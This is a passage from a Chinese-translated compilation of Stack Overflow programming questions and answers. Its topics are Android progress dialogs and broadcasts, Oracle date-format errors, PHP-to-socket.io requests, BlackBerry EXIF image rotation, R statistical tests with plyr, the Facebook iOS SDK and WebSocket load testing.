    ProgressDialog progDialog;
    Button button1, button2;
    int typeBar;                     // Determines type progress bar: 0 = spinner, 1 = horizontal
    int delay = 1000;                  // Milliseconds of delay in the update loop
    int maxBarValue = 30;           // Maximum value of horizontal progress bar

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

//      // Process button to start spinner progress dialog with anonymous inner class
//      button1 = (Button) findViewById(R.id.Button01);
//      button1.setOnClickListener(new OnClickListener()
//      {
//          public void onClick(View v) 
//          {
//              typeBar = 0;
//              showDialog(typeBar);
//          }
//      }); 

        // Process button to start horizontal progress bar dialog with anonymous inner class
        button2 = (Button) findViewById(R.id.Button02);
        button2.setOnClickListener(new OnClickListener()
        {
            public void onClick(View v) 
            {
                typeBar = 1;
                showDialog(typeBar);
            }
        }); 
    }

    // Method to create a progress bar dialog of either spinner or horizontal type
    @Override
    protected Dialog onCreateDialog(int id) 
    {
        switch(id) 
        {
//      case 0:                      // Spinner
//          progDialog = new ProgressDialog(this);
//          progDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
//          progDialog.setMessage("Loading...");
//          progThread = new ProgressThread(handler);
//          progThread.start();
//          return progDialog;
        case 1:                      // Horizontal
            progDialog = new ProgressDialog(this);
            progDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
            progDialog.setMax(maxBarValue);
            progDialog.setMessage("Dollars in checking account:");
            progThread = new ProgressThread(handler);
            progThread.start();
            return progDialog;
        default:
            return null;
        }
    }

    // Handler on the main (UI) thread that will receive messages from the 
    // second thread and update the progress.

    final Handler handler = new Handler() 
    {
        public void handleMessage(Message msg) 
        {
            // Get the current value of the variable total from the message data
            // and update the progress bar.
            int total = msg.getData().getInt("total");
            progDialog.setProgress(total);
//          if (total >= maxBarValue)
            if (total <= 0 )            
            {
                dismissDialog(typeBar);
                progThread.setState(ProgressThread.DONE);
            }
        }
    };

    // Inner class that performs progress calculations on a second thread.  Implement
    // the thread by subclassing Thread and overriding its run() method.  Also provide
    // a setState(state) method to stop the thread gracefully.

    private class ProgressThread extends Thread 
    {   
        // Class constants defining state of the thread
        final static int DONE = 0;
        final static int RUNNING = 1;

        Handler mHandler;
        int mState;
        int total;

        // Constructor with an argument that specifies Handler on main thread
        // to which messages will be sent by this thread.

        ProgressThread(Handler h) 
        {
            mHandler = h;
        }

        // Override the run() method that will be invoked automatically when 
        // the Thread starts.  Do the work required to update the progress bar on this
        // thread but send a message to the Handler on the main UI thread to actually
        // change the visual representation of the progress. In this example we count
        // the index total down to zero, so the horizontal progress bar will start full and
        // count down.

        @Override
        public void run() 
        {
            mState = RUNNING;   
            total = maxBarValue;
            while (mState == RUNNING) 
            {
                // The method Thread.sleep throws an InterruptedException if Thread.interrupt() 
                // were to be issued while thread is sleeping; the exception must be caught.
                try 
                {
                    // Control speed of update (but precision of delay not guaranteed)
                    Thread.sleep(delay);
                } catch (InterruptedException e) {
                    Log.e("ERROR", "Thread was Interrupted");
                }

                // Send message (with current value of  total as data) to Handler on UI thread
                // so that it can update the progress bar.

                Message msg = mHandler.obtainMessage();
                Bundle b = new Bundle();
                b.putInt("total", total);
                msg.setData(b);
                mHandler.sendMessage(msg);

                total--;    // Count down
            }
        }

        // Set current state of thread (use state=ProgressThread.DONE to stop thread)
        public void setState(int state) 
        {
            mState = state;
        }
    }
} 
```

查看输出，

![在此处输入图像描述](../Images/d048b1ee9fc29d0b8ad5f4721cdb3f21.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-05-10T16:56:07.580

我将提到另一种方法，因为当我在寻找一些实用的方法来从运行 AsyncTask 的 Service 与主 UI 进行通信时，我遇到了这个解决方案。Lucifer 的解决方案对于服务不是模块化的，如果您需要在超过 1 个类中使用您的服务（这是我的情况），您将无法访问变量处理程序，据我所知，您甚至无法发送 Handler作为服务意图（您可以将其发送到 AsyncTask 寿）。解决方案是广播。

```
sendBroadcast(new Intent(WORK_DONE)); 
```

在 AsyncTask 和

```
private BroadcastReceiver receiver = new BroadcastReceiver() {
    public void onReceive(Context c, Intent i) { //update your UI here }
}

registerReceiver(receiver, new IntentFilter(WORK_DONE)); 
```

在你的活动中。

我不喜欢 android 开发人员使用的所有内部类。我知道创建内部类和访问外部类变量更容易，但是一旦您需要再次使用该类，您就注定要编辑代码！我对 Android 很陌生，也许我错了，你实际上不需要重用这些类。从来没有做过更大的项目，所以我不知道，但感觉不对，因为在大学里，他们努力教我们如何编写可重用代码。

# sql - Oracle：不是一个有效的月份

> ID：12603975
> 
> 赞同：10
> 
> 时间：2012-09-26T14:27:31.700
> 
> 标签：sql, oracle

我有一个包含以下字段的表：

报告（表名） Rep_Date（日期） Rep_Time（日期）

Rep_Time 字段的值类似于“01/01/1753 07:30:00”，即时间部分是相关的。我写了以下查询：

```
select Reports.pid, MaxDate from Reports
INNER JOIN (
    select pid, max(TO_DATE(TO_CHAR(REP_DATE, 'DD/MM/YYYY')
        || TO_CHAR(REP_TIME, 'HH24:MI:SS'), 'DD/MM/YYYY HH24:MI:SS')) As MaxDate
    from reports
    group by pid
) ReportMaxDate
on Reports.PID = ReportMaxDate.PID
AND To_Date(To_Char(MaxDate, 'DD/MM/YYYY')) = REP_DATE
WHERE REPORTS.PID=61 
```

查询的派生表部分运行，但是当我运行整个查询时出现错误：“不是有效月份”。为什么是这样？

为了帮助调试这个；如果我运行以下查询：

```
select rep_date, rep_time from reports where pid=61 and rownum=1 
```

我得到：

```
Rep_Date = 01/04/2009
Rep_Time = 01/01/1753 13:00:00 
```

更新 15:58 我现在可以执行以下查询：

```
select Reports.pid, MaxDate from Reports
INNER JOIN (
    select pid, max(TO_DATE(TO_CHAR(REP_DATE, 'DD/MM/YYYY')
        || TO_CHAR(REP_TIME, 'HH24:MI:SS'), 'DD/MM/YYYY HH24:MI:SS')) As MaxDate
    from reports group by pid
) ReportMaxDate
on Reports.PID = ReportMaxDate.PID
AND to_date(to_char(maxdate,'MM/DD/YYYY'),'MM/DD/YYYY') = REP_DATE
WHERE REPORTS.PID=61 
```

但是，我需要在将`WHERE`MaxDate 的时间部分与 rep_time 进行比较的子句中再添加一条语句：`to_date(to_char(maxdate,'MM/DD/YYYY'),'MM/DD/YYYY') = REP_DATE`不起作用。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-09-26T14:32:04.220

1.

```
To_Date(To_Char(MaxDate, 'DD/MM/YYYY')) = REP_DATE 
```

导致问题。当您使用不带时间格式的 to_date 时，oracle 将使用当前会话 NLS 格式进行转换，在您的情况下可能不是“DD/MM/YYYY”。检查这个...

```
SQL> select sysdate from dual;

SYSDATE
---------
26-SEP-12

Which means my session's setting is DD-Mon-YY

SQL> select to_char(sysdate,'MM/DD/YYYY') from dual;

TO_CHAR(SY
----------
09/26/2012

SQL> select to_date(to_char(sysdate,'MM/DD/YYYY')) from dual;
select to_date(to_char(sysdate,'MM/DD/YYYY')) from dual
               *
ERROR at line 1:
ORA-01843: not a valid month

SQL> select to_date(to_char(sysdate,'MM/DD/YYYY'),'MM/DD/YYYY') from dual;

TO_DATE(T
---------
26-SEP-12 
```

2.

更重要的是，为什么要转换为 char 再转换为 date，而不是直接比较

```
MaxDate = REP_DATE 
```

如果您想在比较之前忽略 MaxDate 中的时间分量，您应该使用..

```
trunc(MaxDate ) = rep_date 
```

反而。

==更新：基于更新的问题。

```
Rep_Date = 01/04/2009 Rep_Time = 01/01/1753 13:00:00 
```

我认为问题更复杂。如果 rep_time 只是时间，那么您不能将其作为日期存储在数据库中。它必须是一个字符串或日期到时间间隔或数字为秒（感谢亚历克斯，看到[这个](https://stackoverflow.com/questions/12215281/oracle-insert-only-time/12216981#12216981)）。如果可能的话，我建议使用一个同时包含日期和时间的列 rep_date 并将其直接与最大日期列进行比较。

如果它是一个正在运行的系统并且你无法控制更新，你可以试试这个。

```
trunc(rep_date) = trunc(maxdate) and 
to_char(rep_date,'HH24:MI:SS') = to_char(maxdate,'HH24:MI:SS') 
```

无论哪种方式，时间都存储不正确（从 1753 年就可以看出），并且可能存在其他问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-06T21:52:49.517

要知道实际的日期格式，请使用 sysdate 插入一条记录。这样您就可以找到实际的日期格式。例如

```
insert into emp values(7936, 'Mac', 'clerk', 7782, sysdate, 1300, 300, 10); 
```

现在，选择插入的记录。

```
select ename, hiredate from emp where ename='Mac'; 
```

结果是

```
ENAME   HIREDATE
Mac     06-JAN-13 
```

瞧，现在找到了您的实际日期格式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-11-23T05:09:42.870

您还可以使用 ALTER SESSION 命令为您的会话更改此数据库参数的值，并根据需要使用它

```
ALTER SESSION SET NLS_DATE_FORMAT = 'DD-MM-YYYY';
SELECT TO_DATE('05-12-2015') FROM dual;

05/12/2015 
```

# asp.net-mvc - 带有数据表的 MVC 4 (nuget mvc.jquery.datatables)

> ID：12603982
> 
> 赞同：1
> 
> 时间：2012-09-26T14:27:44.203
> 
> 标签：asp.net-mvc, asp.net-mvc-4, jquery-datatables

[我从https://github.com/mcintyre321/mvc.jquery.datatables](https://github.com/mcintyre321/mvc.jquery.datatables)下载了 nuget 包 mvc.jquery.datatables，它旨在与 MVC 3 一起运行。

我发现在 [http://www.distribucon.com/blog/jQueryDataTablesInASPNETMVC.aspx上发布的 MVC 4 需要进行一些更改](http://www.distribucon.com/blog/jQueryDataTablesInASPNETMVC.aspx)

我不明白为什么我会收到“正在从服务器加载数据”消息，而我的控制器中的方法从未被调用过。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T09:02:24.373

我需要先注册 JQuery 包。

```
@Scripts.Render("~/bundles/jquery") 
```

# php - 向 Sockets.IO 发送 PHP GET 请求

> ID：12603986
> 
> 赞同：1
> 
> 时间：2012-09-26T14:27:52.443
> 
> 标签：php, node.js, express, socket.io

我试图从 PHP (CLI) 发送一个 GET 或 POST 请求到一个 Node.js/Sockets.IO 应用程序，只使用基本的 cURL。这是我到目前为止所拥有的，我可以看到对 node.js 的响应（来自 cli），但不能再进一步了。目前我只希望将参数发送到控制台。（我可以稍后扩展）

任何帮助都会很棒！

（仅供参考：我确实看过这个，[来自 php 源的 Socket.io](https://stackoverflow.com/questions/6229472/socket-io-from-php-source/12601565#12601565)，但需要更多帮助。确切的代码会很棒）

**PHP**

```
$qry_str = "?msg_from_php=This_is_a_test123&y=20"; 
$ServerAddress = 'http://10.1.1.69/socket.io/1/websocket/TICWI50sbew59XRE-O';
$ServerPort = '4000';
$TimeOut = 20;
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $ServerAddress. $qry_str);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
curl_setopt($ch, CURLOPT_PORT, $ServerPort);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $TimeOut);
curl_setopt($ch, CURLOPT_TIMEOUT, '3');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, true);

// not sure if it should be in an array
//$data = array('msg_from_php' => 'simple message!');
//curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$content = trim(curl_exec($ch));
curl_close($ch);
echo "  Sent! Content: $content  \r\n"; 
```

**节点.JS**

```
var express = require('express'), http = require('http');
var app = express();
var server = http.createServer(app);
var io = require('socket.io').listen(server);

io.configure('production', function(){
    io.enable('browser client minification');
    io.enable('browser client etag'); 
    io.enable('browser client gzip'); 
    io.set('log level', 1); 
    io.set('transports', ['websocket', 'flashsocket', 'htmlfile', 'xhr-polling', 'jsonp-polling']);
    io.set("polling duration", 30); 
});
server.listen(4000);  // 80,443, 843, 4000, 4001

io.sockets.on('connection', function (socket) {
    socket.on('msg_from_php, function (data) {
        console.log(data);
    });
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T16:06:24.583

您正在尝试与 socket.io 服务器建立一个普通的 HTTP 连接，但 socket.io 不会说普通的 HTTP；它至少使用一个专门的握手协议，如果它使用 websocket 传输，它根本不会使用 HTTP。AFAIK 没有 socket.io 客户端的 PHP 实现。

幸运的是，看起来您的 PHP 应用程序需要按照自己的条件发送到您的节点应用程序，而不是相反，所以您需要做的就是使用 express 定义几个路由来实现 RESTful 接口；然后，您的 PHP 应用程序可以使用 cURL 发布到与相应路由对应的 URL。

# blackberry - 在支持加速度计的黑莓设备上拍照后透视图像错误

> ID：12603987
> 
> 赞同：2
> 
> 时间：2012-09-26T14:27:56.013
> 
> 标签：blackberry, rotation, orientation, image, exif

当我读取从相机拍摄的照片时，存在**透视图像问题。**当方向为北时，图片看起来需要旋转 270 度。当方向为东时，图片应旋转 180 度。但是，当方向是西时，它是好的。我试过[getMetaData()](http://www.blackberry.com/developers/docs/5.0.0api/net/rim/device/api/system/EncodedImage.html#getMetaData%28%29)。[EncodedImage 中的 getKeyValue("orientation")](http://www.blackberry.com/developers/docs/5.0.0api/javax/microedition/media/control/MetaDataControl.html#getKeyValue%28java.lang.String%29)用于生成良好的旋转公式，但它返回空字符串。请帮助我如何解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T11:27:09.890

在这里找到解决方案： [https ://gist.github.com/3788313](https://gist.github.com/3788313)

```
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.EncodedImage;

public class ExifRotate {

    /**
     * Flip the image horizontally.
     */
    public static final int FLIP_H = 1;

    /**
     * Flip the image vertically.
     */
    public static final int FLIP_V = 2;

    /**
     * Flip the image horizontally and vertically.
     */
    public static final int FLIP_HV = 3;

    /**
     * Rotate the image 90 degrees clockwise.
     */
    public static final int FLIP_90CW = 4;

    /**
     * Rotate the image 90 degrees counter-clockwise.
     */
    public static final int FLIP_90CCW = 5;

    /**
     * Rotate the image 180 degrees.
     */
    public static final int FLIP_180 = 6;

    private final static int read2bytes(InputStream in) throws IOException  {
        return in.read() << 8 | in.read();
    }

    private final static int readByte(InputStream in) throws IOException {
        return in.read();
    }

    public static Bitmap readImageFromFile(String filename, int width, int height) throws IOException {
        EncodedImage img = null;
        byte[] data = null;

        FileConnection file = null;
        try {
            file = (FileConnection) Connector.open(filename, Connector.READ);
            int fileSize = (int) file.fileSize();
            if (fileSize == 0) {
                throw new IOException("File is empty");
            }

            data = new byte[fileSize];
            InputStream input = file.openInputStream();
            input.read(data);
            input.close();

            img = EncodedImage.createEncodedImage(data, 0, data.length);

            int orientation = -1;
            if ( filename.toLowerCase().endsWith(".jpg") || filename.toLowerCase().endsWith(".jpeg")) {
                ByteArrayInputStream is = new ByteArrayInputStream( data );
                orientation = getRotation(is);
            }

            if ( orientation == 2 ) {
                return rotateBitmap(img.getBitmap(), ImageUtil.FLIP_H);
            } else if ( orientation == 3 ) {
                return rotateBitmap(img.getBitmap(), ImageUtil.FLIP_180);
            } else if ( orientation == 4 ) {
                return rotateBitmap(img.getBitmap(), ImageUtil.FLIP_V);
            } else if ( orientation == 5 ) {
                Bitmap tmp = rotateBitmap(img.getBitmap(), ImageUtil.FLIP_H);
                tmp = rotateBitmap(tmp, ImageUtil.FLIP_90CCW);
                return tmp;
            } else if ( orientation == 6 ) {
                return rotateBitmap(img.getBitmap(), ImageUtil.FLIP_90CW);
            } else if ( orientation == 7 ) {
                Bitmap tmp = rotateBitmap(img.getBitmap(), ImageUtil.FLIP_H);
                tmp = rotateBitmap(tmp, ImageUtil.FLIP_90CW);
                return tmp;
            } else if ( orientation == 8 ) {
                return rotateBitmap(img.getBitmap(), ImageUtil.FLIP_90CCW);
            } else {
                return img.getBitmap();
            }
        } finally {
            if (file != null) {
                try { file.close(); }
                catch(Exception ex){}
            }
        }
    }

    public static int getRotation(InputStream in) throws IOException {
        int [] exif_data = new int[100];
        int n_flag = 0, set_flag = 0;
        int is_motorola = 0;

        /* Read File head, check for JPEG SOI + Exif APP1 */
        for (int i = 0; i < 4; i++)
            exif_data[i] = readByte(in);

        if (exif_data[0] != 0xFF || exif_data[1] != 0xD8 || exif_data[2] != 0xFF || exif_data[3] != 0xE1)
            return -2;

        /* Get the marker parameter length count */
        int length = read2bytes(in);
        // exif_data = new int[length];

        /* Length includes itself, so must be at least 2 */
        /* Following Exif data length must be at least 6 */
        if (length < 8)
            return -1;
        length -= 8;
        /* Read Exif head, check for "Exif" */
        for (int i = 0; i < 6; i++)
            exif_data[i] = in.read();

        if (exif_data[0] != 0x45 || exif_data[1] != 0x78 || exif_data[2] != 0x69 || exif_data[3] != 0x66 || exif_data[4] != 0 || exif_data[5] != 0)
            return -1;

        /* Read Exif body */
        length = length > exif_data.length ? exif_data.length : length;
        for (int i = 0; i < length; i++)
            exif_data[i] = in.read();

        if (length < 12)
            return -1; /* Length of an IFD entry */

        /* Discover byte order */
        if (exif_data[0] == 0x49 && exif_data[1] == 0x49)
            is_motorola = 0;
        else if (exif_data[0] == 0x4D && exif_data[1] == 0x4D)
            is_motorola = 1;
        else
            return -1;

        /* Check Tag Mark */
        if (is_motorola == 1) {
            if (exif_data[2] != 0)
                return -1;
            if (exif_data[3] != 0x2A)
                return -1;
        } else {
            if (exif_data[3] != 0)
                return -1;
            if (exif_data[2] != 0x2A)
                return -1;
        }

        /* Get first IFD offset (offset to IFD0) */
        int offset;
        if (is_motorola == 1) {
            if (exif_data[4] != 0)
                return -1;
            if (exif_data[5] != 0)
                return -1;
            offset = exif_data[6];
            offset <<= 8;
            offset += exif_data[7];
        } else {
            if (exif_data[7] != 0)
                return -1;
            if (exif_data[6] != 0)
                return -1;
            offset = exif_data[5];
            offset <<= 8;
            offset += exif_data[4];
        }
        if (offset > length - 2)
            return -1; /* check end of data segment */

        /* Get the number of directory entries contained in this IFD */
        int number_of_tags;
        if (is_motorola == 1) {
            number_of_tags = exif_data[offset];
            number_of_tags <<= 8;
            number_of_tags += exif_data[offset + 1];
        } else {
            number_of_tags = exif_data[offset + 1];
            number_of_tags <<= 8;
            number_of_tags += exif_data[offset];
        }
        if (number_of_tags == 0)
            return -1;
        offset += 2;

        /* Search for Orientation Tag in IFD0 */
        for (;;) {
            if (offset > length - 12)
                return -1; /* check end of data segment */
            /* Get Tag number */
            int tagnum;
            if (is_motorola == 1) {
                tagnum = exif_data[offset];
                tagnum <<= 8;
                tagnum += exif_data[offset + 1];
            } else {
                tagnum = exif_data[offset + 1];
                tagnum <<= 8;
                tagnum += exif_data[offset];
            }
            if (tagnum == 0x0112)
                break; /* found Orientation Tag */
            if (--number_of_tags == 0)
                return -1;
            offset += 12;
        }

        /*
         * if (set_flag==1) { Set the Orientation value if (is_motorola==1) {
         * exif_data[offset+2] = 0; Format = unsigned short (2 octets)
         * exif_data[offset+3] = 3; exif_data[offset+4] = 0; Number Of
         * Components = 1 exif_data[offset+5] = 0; exif_data[offset+6] = 0;
         * exif_data[offset+7] = 1; exif_data[offset+8] = 0; exif_data[offset+9]
         * = set_flag; exif_data[offset+10] = 0; exif_data[offset+11] = 0; }
         * else { exif_data[offset+2] = 3; Format = unsigned short (2 octets)
         * exif_data[offset+3] = 0; exif_data[offset+4] = 1; Number Of
         * Components = 1 exif_data[offset+5] = 0; exif_data[offset+6] = 0;
         * exif_data[offset+7] = 0; exif_data[offset+8] = set_flag;
         * exif_data[offset+9] = 0; exif_data[offset+10] = 0;
         * exif_data[offset+11] = 0; } }
         */
        // else {
        /* Get the Orientation value */
        if (is_motorola == 1) {
            if (exif_data[offset + 8] != 0)
                return -1;
            set_flag = exif_data[offset + 9];
        } else {
            if (exif_data[offset + 9] != 0)
                return -1;
            set_flag = exif_data[offset + 8];
        }
        if (set_flag > 8)
            return -1;
        // }

        /* Write out Orientation value */

        if (n_flag == 1)
            System.out.println("set_flag " + set_flag);
        else
            System.out.println("set_flag " + set_flag);

        return set_flag;
    }

    public static Bitmap rotateBitmap(Bitmap src, int operation) {
        int width = src.getWidth();
        int height = src.getHeight();

        int[] inPixels = new int[width*height];
        src.getARGB(inPixels, 0, width, 0, 0, width, height);

        int x = 0, y = 0;
        int w = width;
        int h = height;

        int newX = 0;
        int newY = 0;
        int newW = w;
        int newH = h;
        switch (operation) {
        case FLIP_H:
            newX = width - (x + w);
            break;
        case FLIP_V:
            newY = height - (y + h);
            break;
        case FLIP_HV:
            newW = h;
            newH = w;
            newX = y;
            newY = x;
            break;
        case FLIP_90CW:
            newW = h;
            newH = w;
            newX = height - (y + h);
            newY = x;
            break;
        case FLIP_90CCW:
            newW = h;
            newH = w;
            newX = y;
            newY = width - (x + w);
            break;
        case FLIP_180:
            newX = width - (x + w);
            newY = height - (y + h);
            break;
        }

        int[] newPixels = new int[newW * newH];
        int index, newRow, newCol, newIndex;

        if ( operation == FLIP_H ) {
            for (int row = 0; row < h; row++) {
                for (int col = 0; col < w; col++) {
                    index = row * width + col;
                    newRow = row;
                    newCol = w - col - 1;
                    newIndex = newRow * newW + newCol;
                    newPixels[newIndex] = inPixels[index];
                }
            }
        } else if ( operation == FLIP_V ) {
            for (int row = 0; row < h; row++) {
                for (int col = 0; col < w; col++) {
                    index = row * width + col;
                    newRow = h - row - 1;
                    newCol = col;
                    newIndex = newRow * newW + newCol;
                    newPixels[newIndex] = inPixels[index];
                }
            }
        } else if ( operation == FLIP_HV ) {
            for (int row = 0; row < h; row++) {
                for (int col = 0; col < w; col++) {
                    index = row * width + col;
                    newRow = col;
                    newCol = row;
                    newIndex = newRow * newW + newCol;
                    newPixels[newIndex] = inPixels[index];
                }
            }
        } else if ( operation == FLIP_90CW ) {
            for (int row = 0; row < h; row++) {
                for (int col = 0; col < w; col++) {
                    index = row * width + col;
                    newRow = col;
                    newCol = h - row - 1;
                    newIndex = newRow * newW + newCol;
                    newPixels[newIndex] = inPixels[index];
                }
            }
        } else if ( operation == FLIP_90CCW ) {
            for (int row = 0; row < h; row++) {
                for (int col = 0; col < w; col++) {
                    index = row * width + col;
                    newRow = w - col - 1;
                    newCol = row;
                    newIndex = newRow * newW + newCol;
                    newPixels[newIndex] = inPixels[index];
                }
            }
        } else if ( operation == FLIP_180 ) {
            for (int row = 0; row < h; row++) {
                for (int col = 0; col < w; col++) {
                    index = row * width + col;
                    newRow = h - row - 1;
                    newCol = w - col - 1;
                    newIndex = newRow * newW + newCol;
                    newPixels[newIndex] = inPixels[index];
                }
            }
        }

        Bitmap dst = new Bitmap( newW, newH );
        dst.setARGB(newPixels, 0, newW, 0, 0, newW, newH);

        return dst;
    }

} 
```

# r - 计算两个子组之间的统计检验的 ggplot2/plyr 方法是什么？

> ID：12603988
> 
> 赞同：8
> 
> 时间：2012-09-26T14:27:57.790
> 
> 标签：r, ggplot2, plyr

我是 R 的新手，并且开始欣赏 ggplot2 和 plyr 的优雅。现在，我正在尝试分析一个我无法在此处共享的大型数据集，但我已经用 Diamonds 数据集（为方便起见缩短了）重建了我的问题。无需再费周折：

```
diam <- diamonds[diamonds$cut=="Fair"|diamonds$cut=="Ideal",]
boxplots <- ggplot(diam, aes(x=cut, price)) + geom_boxplot(aes(fill=cut)) + facet_wrap(~ color)
print(boxplots) 
```

![](../Images/714713098f73f0dd71c7739057bb23f4.png)

该情节产生的是一组箱线图，比较了“公平”和“理想”两个剪辑的价格。

我现在非常想继续使用 t.test 或 wilcox.test 对每个颜色子组 (D,E,F,..,J) 的两个削减进行统计比较。

我将如何以与 ggplot2-syntax 一样优雅的方式实现它？我假设我会使用 plyr-package 中的 ddply，但我不知道如何将两个子组输入到计算适当统计数据的函数中。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-26T16:50:24.737

我想你正在寻找：

```
library(plyr)
ddply(diam,"color",
      function(x) {
          w <- wilcox.test(price~cut,data=x)
          with(w,data.frame(statistic,p.value))
      }) 
```

（替代似乎也`t.test`可以`wilcox.test`正常工作。）

结果：

```
 color statistic      p.value
1     D  339753.5 4.232833e-24
2     E  591104.5 6.789386e-19
3     F  731767.5 2.955504e-11
4     G  950008.0 1.176953e-12
5     H  611157.5 2.055857e-17
6     I  213019.0 3.299365e-04
7     J   56870.0 2.364026e-01 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T16:37:37.457

ddply 返回一个数据框作为输出，并且假设我正在正确阅读您的问题，这不是您想要的。我相信您想使用一系列数据子集进行一系列 t 检验，因此唯一真正的任务是编译这些子集的列表。拥有它们后，您可以使用类似 lapply() 的函数对列表中的每个子集运行 t 检验。我确信这不是最优雅的解决方案，但一种方法是使用如下函数创建一个独特的颜色对列表：

```
get.pairs <- function(v){
  l <- length(v)
  n <- sum(1:l-1)
  a <- vector("list",n)
  j = 1
  k = 2
  for(i in 1:n){
    a[[i]] <- c(v[j],v[k])
    if(k < l){
      k <- k + 1
    } else {
     j = j + 1
     k = j + 1
    }
  }
 return(a)
} 
```

现在您可以使用该函数来获取您的唯一颜色对列表：

```
> (color.pairs <- get.pairs(levels(diam$color))))
[[1]]
[1] "D" "E"

[[2]]
[1] "D" "F"

...

[[21]]
[1] "I" "J" 
```

现在，您可以使用这些列表中的每一个在数据框的子集上运行 t.test（或任何您想要的），如下所示：

```
> t.test(price~cut,data=diam[diam$color %in% color.pairs[[1]],])

    Welch Two Sample t-test

data:  price by cut 
t = 8.1594, df = 427.272, p-value = 3.801e-15
alternative hypothesis: true difference in means is not equal to 0 
95 percent confidence interval:
 1008.014 1647.768 
sample estimates:
 mean in group Fair mean in group Ideal 
           3938.711            2610.820 
```

现在使用 lapply() 对颜色对列表中的每个子集运行测试：

```
> lapply(color.pairs,function(x) t.test(price~cut,data=diam[diam$color %in% x,]))
[[1]]

    Welch Two Sample t-test

data:  price by cut 
t = 8.1594, df = 427.272, p-value = 3.801e-15
alternative hypothesis: true difference in means is not equal to 0 
95 percent confidence interval:
 1008.014 1647.768 
sample estimates:
 mean in group Fair mean in group Ideal 
           3938.711            2610.820 

...

[[21]]

    Welch Two Sample t-test

data:  price by cut 
t = 0.8813, df = 375.996, p-value = 0.3787
alternative hypothesis: true difference in means is not equal to 0 
95 percent confidence interval:
 -260.0170  682.3882 
sample estimates:
 mean in group Fair mean in group Ideal 
       4802.912            4591.726 
```

# iphone - Facebook IOS SDK 3.1 - reauthorizeWithPublishPermissions？

> ID：12603992
> 
> 赞同：2
> 
> 时间：2012-09-26T14:28:03.080
> 
> 标签：iphone, ios, facebook, sdk

刚刚升级到 Facebook iOS SDK 3.1 并且已经遇到问题。

我的应用找不到 facebook 方法*reauthorizeWithPublishPermissions*，而且它也不知道静态*FBSessionDefaultAudienceFriends*定义是什么！

其他人见过这些问题吗？不敢相信 3.1 SDK 会有这些基本的错误，所以我现在责怪我的愚蠢！

为了完整起见，这是我的代码：

```
[FBSession reauthorizeWithPublishPermissions:[NSArray arrayWithObjects:@"publish_stream", @"publish_actions",nil]
    defaultAudience:FBSessionDefaultAudienceFriends 
    completionHandler:^(FBSession *session, NSError *error) {

        // Do something...

}]; 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-12-02T06:10:16.167

**@Zotter，答案已贬值**。现在（使用最新的 Facebook iOS SDK，我猜是 v.3.19）您必须使用`- (void)requestNewReadPermissions:(NSArray *)readPermissions completionHandler:(FBSessionRequestPermissionResultHandler)handler;`方法来授权具有发布权限的应用程序。

```
[FBSession.activeSession requestNewPublishPermissions:permissions
defaultAudience:FBSessionDefaultAudienceFriends
completionHandler:^(FBSession *session, NSError *error) {
    if(!error) {

    }
}]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T20:32:24.507

```
 /*! No audience needed; this value is useful for cases where data will only be read from Facebook */

    FBSessionDefaultAudienceNone                = 0,
    /*! Indicates that only the user is able to see posts made by the application */
    FBSessionDefaultAudienceOnlyMe              = 10,
    /*! Indicates that the user's friends are able to see posts made by the application */
    FBSessionDefaultAudienceFriends             = 20,
    /*! Indicates that all Facebook users are able to see posts made by the application */
    FBSessionDefaultAudienceEveryone            = 30, 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T05:41:17.690

reauthorizeWithPublishPermissions：是一个实例方法

```
 [FBSession.activeSession reauthorizeWithPublishPermissions:permissions defaultAudience:FBSessionDefaultAudienceFriends completionHandler:
     ^(FBSession *session,
       NSError *error)
     {
         ...
     }]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T18:44:06.373

我有这个问题。我使用的是旧版本的 Cocoapods，它没有将源代码从 3.0 正确升级到 3.1。如果您使用的是 Cocoapods，请升级到 0.14.0 并重试。如果没有，请仔细检查以确保您拥有来自 master 的最新 Facebook SDK - 如果您在 FBSession.h 中没有看到这些值，则您可能拥有旧版本的 SDK。

# websocket - 如何对 websocket 进行负载测试

> ID：12603998
> 
> 赞同：49
> 
> 时间：2012-09-26T14:28:24.850
> 
> 标签：websocket, load-testing

我们正在构建一个使用 websockets 的群聊功能。我们想测试我们当前的基础设施可以支持多少连接。

基本上它归结为如何模拟 websocket。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-25T12:03:33.510

我可以根据我最近的经验给你一个建议。您可以将基于 webkit 的 Phantom 虚拟客户端连接到您的聊天服务器并测量资源使用情况（即 CPU、内存，可能正在使用 shell 脚本或其他实用程序，或者您可以分析您的服务）

```
var system = require('system');
var page = require('webpage').create();
page.viewportSize = { width: 1024, height: 768 };

page.open("<URL to chat server service>", function (status) {
    // Check for page load success
    if (status !== "success") {
        console.log("Unable to connect");
        phantom.exit();
    } else {
        console.log("Client connected  ");
        //after connecting you may extract further information, taking screenshots etc. refer the phantom.js API for further details
    }
}); 
```

您是否使用任何框架（如套接字 IO）进行 websocket 通信？

